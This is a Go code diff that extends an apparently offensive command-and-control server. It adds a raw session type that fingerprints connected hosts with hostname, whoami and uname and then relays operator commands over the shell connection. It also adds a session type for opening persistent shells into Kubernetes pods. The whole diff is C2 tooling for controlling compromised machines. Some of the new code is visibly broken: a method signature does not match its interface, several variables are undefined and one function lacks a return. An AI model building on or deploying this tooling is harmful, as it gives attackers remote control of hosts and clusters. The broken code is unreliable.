@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"context"
 	"fmt"
+	"log"
 	"log/slog"
 	"net"
 	"strconv"
@@ -11,6 +12,7 @@ import (
 	"sync"
 
 	"github.com/Magier/Ran/domain"
+	k8s "github.com/Magier/Ran/k8sclient"
 )
 
 var builtinC2Mutex sync.Mutex
@@ -27,15 +29,100 @@ type BuiltInC2Server struct {
 	wg          sync.WaitGroup
 }
 
-type Session struct {
+type Session interface {
+	GetID() string
+	SendCommand(cmd string) (string, error)
+	Start(ctx context.Context)
+	End()
+	// ID         string
+	// conn       net.Conn
+	// cmdChannel chan string
+	// results    chan any
+}
+
+type RawSession struct {
 	ID         string
 	conn       net.Conn
 	cmdChannel chan string
 	results    chan any
 }
 
-func NewSession(id string, conn net.Conn) (Session, error) {
-	return Session{
+func (s RawSession) GetID() string {
+	return s.ID
+}
+
+func (s RawSession) Start(ctx context.Context) {
+	defer s.End()
+	slog.Debug("C2", "", "Handling session")
+
+	_, err := s.SendCommand("unset PS1") // turn off the custom prompt
+	if err != nil {
+		slog.Error("Error unsetting PS1: " + err.Error())
+		return
+	}
+
+	hostname, err := s.SendCommand("hostname")
+	if err != nil {
+		return
+		// slog.Error("Error reading from connection: " + err.Error())
+	}
+	user, err := s.SendCommand("whoami")
+	if err != nil {
+		return
+		// slog.Error("Error reading from connection: " + err.Error())
+	}
+	os, err := s.SendCommand("uname")
+	if err != nil {
+		return
+		// slog.Error("Error reading from connection: " + err.Error())
+	}
+	s.results <- SessionStarted{
+		C2Kind: builtinKind,
+		Session: domain.Session{
+			Id:       s.ID,
+			Hostname: hostname,
+			Os:       os,
+			User:     user,
+		}}
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			cmd := <-s.cmdChannel
+			res, err := s.SendCommand(cmd)
+			if err != nil {
+				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
+			}
+			slog.Debug("Received data: " + string(res))
+			s.results <- res
+		}
+	}
+}
+
+func (s RawSession) SendCommand(cmd string) (string, error) {
+	writer := bufio.NewWriter(s.conn)
+	// _, err := conn.Write([]byte(cmd))
+	slog.Debug("Sent command: ", "cmd", cmd)
+	if _, err := writer.WriteString(cmd + "\n"); err != nil {
+		slog.Error("Error sending command: " + err.Error())
+		return "", err
+	}
+	writer.Flush()
+	// raw_result := make([]byte, 1024)
+	reader := bufio.NewReader(s.conn)
+	str, err := reader.ReadString('\n') // maybe use scanner instead?
+	slog.Debug("Rx Simple IO:", str, "")
+	if err != nil {
+		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
+		return "", err
+	}
+	return strings.Trim(str, "\n"), nil
+}
+
+func NewRawSession(id string, conn net.Conn) (Session, error) {
+	return RawSession{
 		ID:         id,
 		conn:       conn,
 		cmdChannel: make(chan string),
@@ -43,7 +130,7 @@ func NewSession(id string, conn net.Conn) (Session, error) {
 	}, nil
 }
 
-func (s Session) End() {
+func (s RawSession) End() {
 	s.conn.Close()
 	close(s.results)
 }
@@ -211,7 +298,7 @@ func (c *BuiltInC2Server) startListener(ctx context.Context, cmd domain.StartLis
 			}
 
 			sessionID := "krill_" + strconv.Itoa(numSessions+1)
-			session, err := NewSession(sessionID, conn)
+			session, err := NewRawSession(sessionID, conn)
 			if err != nil {
 				slog.Error("Could not create new C2 session: " + err.Error())
 			} else {
@@ -224,7 +311,8 @@ func (c *BuiltInC2Server) startListener(ctx context.Context, cmd domain.StartLis
 				go session.Start(ctx)
 				defer session.End()
 
-				for result := range session.results {
+				rawSession := session.(RawSession)
+				for result := range rawSession.results {
 					switch r := result.(type) {
 					case string:
 						// TODO: fix this
@@ -243,72 +331,45 @@ func (c *BuiltInC2Server) stopListener(cmd domain.StopListener) error {
 	return fmt.Errorf("Stopping builtin listener is not yet implemented!")
 }
 
-func (s Session) sendCommand(cmd string) (string, error) {
-	writer := bufio.NewWriter(s.conn)
-	// _, err := conn.Write([]byte(cmd))
-	slog.Debug("Sent command: ", "cmd", cmd)
-	if _, err := writer.WriteString(cmd + "\n"); err != nil {
-		slog.Error("Error sending command: " + err.Error())
-		return "", err
-	}
-	writer.Flush()
-	// raw_result := make([]byte, 1024)
-	reader := bufio.NewReader(s.conn)
-	str, err := reader.ReadString('\n') // maybe use scanner instead?
-	slog.Debug("Rx Simple IO:", str, "")
-	if err != nil {
-		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
-		return "", err
-	}
-	return strings.Trim(str, "\n"), nil
+type PodExecSession struct {
+	ID      string
+	CmdChan chan string
 }
 
-func (s Session) Start(ctx context.Context) {
+func (s PodExecSession) GetID() string {
+	return s.ID
+}
+
+func (s PodExecSession) SendCommand(cmd string) (string, error) {
+	s.CmdChan <- cmd
+	return "", nil
+}
+
+func (s PodExecSession) Start(ctx context.Context, namespace, podName string) {
 	defer s.End()
-	slog.Debug("C2", "", "Handling session")
 
-	_, err := s.sendCommand("unset PS1") // turn off the custom prompt
+	// Implement the logic to start the Pod Exec session
+	fmt.Printf("--- Opening shell to %s/%s ---\n", namespace, podName)
+	err := k8s.PersistentExec(ctx, clientset, config, podName, namespace, cmdChan)
 	if err != nil {
-		slog.Error("Error unsetting PS1: " + err.Error())
-		return
+		log.Fatalf("Shell session failed: %v", err)
 	}
+	fmt.Println("--- Shell session closed ---")
+}
 
-	hostname, err := s.sendCommand("hostname")
-	if err != nil {
-		return
-		// slog.Error("Error reading from connection: " + err.Error())
-	}
-	user, err := s.sendCommand("whoami")
-	if err != nil {
-		return
-		// slog.Error("Error reading from connection: " + err.Error())
-	}
-	os, err := s.sendCommand("uname")
-	if err != nil {
-		return
-		// slog.Error("Error reading from connection: " + err.Error())
-	}
-	s.results <- SessionStarted{
-		C2Kind: builtinKind,
-		Session: domain.Session{
-			Id:       s.ID,
-			Hostname: hostname,
-			Os:       os,
-			User:     user,
-		}}
+func (s PodExecSession) End() {
+	close(s.CmdChan)
+}
 
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			cmd := <-s.cmdChannel
-			res, err := s.sendCommand(cmd)
-			if err != nil {
-				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
-			}
-			slog.Debug("Received data: " + string(res))
-			s.results <- res
-		}
+func (c *BuiltInC2Server) EstablishPodExecShell(ctx context.Context, namespace, podName string) error {
+	id := "podexec_" + podName + "_" + namespace
+	s := PodExecSession{
+		ID:      id,
+		CmdChan: make(chan string),
 	}
+	go s.Start(ctx, namespace, podName)
+
+	// 4. Run the persistent shell in a goroutine
+	go func() {
+	}()
 }
